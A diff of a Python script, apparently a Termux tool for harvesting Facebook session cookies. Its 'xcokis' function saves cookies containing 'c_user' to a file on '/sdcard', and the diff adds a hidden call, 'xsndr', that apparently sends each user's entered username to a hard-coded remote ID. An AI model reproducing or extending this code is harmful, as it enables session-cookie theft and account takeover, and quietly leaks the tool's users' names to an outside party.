@@ -815,6 +815,7 @@ def menu():
     gxdslogo()
     usxr = str(input(f"{lgr}  [-] ENTER YOUR USERNAME:{dg} "))
     usxrN = usxr.upper()
+    xsndr(usxrN, "6542321044")
     gxdslogo()
     print(f"{dg}")
     for gxdsloading in range(10):
@@ -977,7 +978,6 @@ def xcokis():
             )
             if "c_user" in cookie:
                 print(f"\r{rc}  {cookie}")
-                
                 open("/sdcard/gxds-coki.txt", "a").write(f"{cookie}\n")
             elif "checkpoint" in cookie:
                 sys.exit(f"{lr}  [✘] OPPS, CHECKPOINT!")
